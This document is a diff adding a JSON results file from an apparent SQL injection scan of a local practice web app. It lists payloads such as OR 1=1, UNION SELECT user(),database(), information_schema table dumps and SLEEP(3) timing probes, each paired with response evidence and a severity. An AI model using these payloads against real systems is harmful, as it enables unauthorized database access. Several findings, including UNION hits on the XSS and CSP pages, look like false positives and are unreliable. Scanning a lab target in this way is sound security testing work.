@@ -1,0 +1,146 @@
+[
+    {
+        "page": "http://localhost:8080/vulnerabilities/brute/",
+        "endpoint": "http://localhost:8080/vulnerabilities/brute/",
+        "method": "get",
+        "payload": "'",
+        "type": "Error-Based",
+        "evidence": "SQL error signature matched: 'you have an error in your sql syntax'",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/exec/",
+        "endpoint": "http://localhost:8080/vulnerabilities/exec/",
+        "method": "post",
+        "payload": "1' OR '1'='1' -- ",
+        "type": "Boolean-Based",
+        "evidence": "Response length changed by 118 bytes vs baseline",
+        "severity": "Medium"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/exec/",
+        "endpoint": "http://localhost:8080/vulnerabilities/exec/",
+        "method": "post",
+        "payload": "1' OR '1'='2' -- ",
+        "type": "Boolean-Based",
+        "evidence": "Response length changed by 118 bytes vs baseline",
+        "severity": "Medium"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/exec/",
+        "endpoint": "http://localhost:8080/vulnerabilities/exec/",
+        "method": "post",
+        "payload": "1' AND 1=1 -- ",
+        "type": "Boolean-Based",
+        "evidence": "Response length changed by 118 bytes vs baseline",
+        "severity": "Medium"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/exec/",
+        "endpoint": "http://localhost:8080/vulnerabilities/exec/",
+        "method": "post",
+        "payload": "1' AND 1=2 -- ",
+        "type": "Boolean-Based",
+        "evidence": "Response length changed by 118 bytes vs baseline",
+        "severity": "Medium"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "'",
+        "type": "Error-Based",
+        "evidence": "SQL error signature matched: 'you have an error in your sql syntax'",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "1' OR '1'='1' -- ",
+        "type": "Boolean-Based",
+        "evidence": "Response length changed by 313 bytes vs baseline",
+        "severity": "Medium"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "1' AND 1=2 -- ",
+        "type": "Boolean-Based",
+        "evidence": "Response length changed by 59 bytes vs baseline",
+        "severity": "Medium"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "1' UNION SELECT null,null -- ",
+        "type": "UNION-Based",
+        "evidence": "Response grew by 105 bytes \u2014 possible data leak",
+        "severity": "Critical"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "1' UNION SELECT user(),database() -- ",
+        "type": "UNION-Based",
+        "evidence": "Response grew by 138 bytes \u2014 possible data leak",
+        "severity": "Critical"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "1' UNION SELECT table_name,NULL FROM information_schema.tables -- ",
+        "type": "UNION-Based",
+        "evidence": "Response grew by 10440 bytes \u2014 possible data leak",
+        "severity": "Critical"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli/",
+        "method": "get",
+        "payload": "1' AND SLEEP(3) -- ",
+        "type": "Time-Based",
+        "evidence": "Response delayed 3.01s \u2014 time-based blind SQLi",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/sqli_blind/",
+        "endpoint": "http://localhost:8080/vulnerabilities/sqli_blind/",
+        "method": "get",
+        "payload": "1' AND SLEEP(3) -- ",
+        "type": "Time-Based",
+        "evidence": "Response delayed 3.01s \u2014 time-based blind SQLi",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "payload": "1' UNION SELECT table_name,NULL FROM information_schema.tables -- ",
+        "type": "UNION-Based",
+        "evidence": "Response grew by 65 bytes \u2014 possible data leak",
+        "severity": "Critical"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "payload": "1' UNION SELECT table_name,NULL FROM information_schema.tables -- ",
+        "type": "UNION-Based",
+        "evidence": "Response grew by 64 bytes \u2014 possible data leak",
+        "severity": "Critical"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/csp/",
+        "endpoint": "http://localhost:8080/vulnerabilities/csp/",
+        "method": "post",
+        "payload": "1' UNION SELECT table_name,NULL FROM information_schema.tables -- ",
+        "type": "UNION-Based",
+        "evidence": "Response grew by 65 bytes \u2014 possible data leak",
+        "severity": "Critical"
+    }
+]
